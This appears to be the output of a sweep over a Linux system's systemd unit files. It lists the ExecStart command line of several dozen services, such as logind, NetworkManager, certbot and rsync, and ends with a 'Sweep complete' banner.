+/usr/lib/systemd/system/systemd-tmpfiles-setup.service:24:ExecStart=systemd-tmpfiles --create --remove --boot --exclude-prefix=/dev
+/usr/lib/systemd/system/postgresql.service:13:ExecStart=/bin/true
+/usr/lib/systemd/system/nfs-server.service:25:ExecStart=/usr/sbin/rpc.nfsd
+/usr/lib/systemd/system/systemd-logind.service:33:ExecStart=/usr/lib/systemd/systemd-logind
+/usr/lib/systemd/system/systemd-pcrphase.service:21:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful ready
+/usr/lib/systemd/system/getty.target.wants/getty-static.service:9:ExecStart=systemctl --no-block start getty@tty2.service getty@tty3.service getty@tty4.service getty@tty5.service getty@tty6.service
+/usr/lib/systemd/system/systemd-update-utmp.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp reboot
+/usr/lib/systemd/system/snapd.apparmor.service:26:ExecStart=/usr/lib/snapd/snapd-apparmor start
+/usr/lib/systemd/system/logrotate.service:9:ExecStart=/usr/sbin/logrotate /etc/logrotate.conf
+/usr/lib/systemd/system/systemd-networkd-wait-online@.service:22:ExecStart=/usr/lib/systemd/systemd-networkd-wait-online -i %i
+/usr/lib/systemd/system/udev.service:28:ExecStart=/usr/lib/systemd/systemd-udevd
+/usr/lib/systemd/system/ubuntu-advantage.service:32:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/daemon.py
+/usr/lib/systemd/system/tpm-udev.service:5:ExecStart=systemd-tmpfiles --create tpm-udev.conf
+/usr/lib/systemd/system/qemu-guest-agent.service:7:ExecStart=-/usr/sbin/qemu-ga
+/usr/lib/systemd/system/upower.service:8:ExecStart=/usr/libexec/upowerd
+/usr/lib/systemd/system/auth-rpcgss-module.service:17:ExecStart=/sbin/modprobe -q auth_rpcgss
+/usr/lib/systemd/system/pg_compresswal@.service:9:ExecStart=/usr/bin/pg_backupcluster %i compresswal
+/usr/lib/systemd/system/systemd-pcrlock-secureboot-policy.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-secureboot-policy
+/usr/lib/systemd/system/systemd-bsod.service:21:ExecStart=/usr/lib/systemd/systemd-bsod --continuous
+/usr/lib/systemd/system/NetworkManager.service:14:ExecStart=/usr/sbin/NetworkManager --no-daemon
+/usr/lib/systemd/system/certbot.service:7:ExecStart=/usr/bin/certbot -q renew --no-random-sleep-on-renew
+/usr/lib/systemd/system/plymouth-reboot.service:12:ExecStart=/usr/sbin/plymouthd --mode=reboot --attach-to-session
+/usr/lib/systemd/system/rescue.target.wants/systemd-update-utmp-runlevel.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp runlevel
+/usr/lib/systemd/system/udisks2.service:8:ExecStart=/usr/libexec/udisks2/udisksd
+/usr/lib/systemd/system/pkgcached.service:9:ExecStart=/usr/libexec/netlink-monitor
+/usr/lib/systemd/system/rpcbind.service:16:ExecStart=/sbin/rpcbind -f $OPTIONS
+/usr/lib/systemd/system/modprobe@.service:20:ExecStart=-/sbin/modprobe -abq %i
+/usr/lib/systemd/system/systemd-pcrlock-firmware-config.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-firmware-config
+/usr/lib/systemd/system/systemd-machine-id-commit.service:23:ExecStart=systemd-machine-id-setup --commit
+/usr/lib/systemd/system/user-runtime-dir@.service:18:ExecStart=/usr/lib/systemd/systemd-user-runtime-dir start %i
+/usr/lib/systemd/system/systemd-tmpfiles-setup-dev.service:24:ExecStart=systemd-tmpfiles --prefix=/dev --create --boot
+/usr/lib/systemd/system/snapd.failure.service:6:ExecStart=/usr/lib/snapd/snap-failure snapd
+/usr/lib/systemd/system/rsync.service:8:ExecStart=/usr/bin/rsync --daemon --no-detach
+/usr/lib/systemd/system/rsync.service:16:#   Alternatively, rsync can run in `daemon' mode, listening on a socket.
+/usr/lib/systemd/system/halt.target.wants/plymouth-switch-root-initramfs.service:18:ExecStart=-/usr/bin/plymouth message --text=""
+/usr/lib/systemd/system/halt.target.wants/plymouth-switch-root-initramfs.service:19:ExecStart=-/usr/bin/plymouth update-root-fs --new-root-dir=/run/initramfs
+/usr/lib/systemd/system/halt.target.wants/plymouth-halt.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/usr/lib/systemd/system/e2scrub_reap.service:20:ExecStart=/sbin/e2scrub_all -A -r
+/usr/lib/systemd/system/systemd-ask-password-wall.service:17:ExecStart=systemd-tty-ask-password-agent --wall
+/usr/lib/systemd/system/systemd-timesyncd.service:29:ExecStart=!!/usr/lib/systemd/systemd-timesyncd
+/usr/lib/systemd/system/fwupd.service:14:ExecStart=/usr/libexec/fwupd/fwupd
+/usr/lib/systemd/system/procps.service:22:ExecStart=/usr/lib/systemd/systemd-sysctl
+/usr/lib/systemd/system/systemd-tpm2-setup-early.service:22:ExecStart=/usr/lib/systemd/systemd-tpm2-setup --early=yes
+/usr/lib/systemd/system/systemd-resolved.service:27:ExecStart=!!/usr/lib/systemd/systemd-resolved
+/usr/lib/systemd/system/systemd-journald.service:30:ExecStart=/usr/lib/systemd/systemd-journald
+
+==============================
+ Sweep complete
+==============================
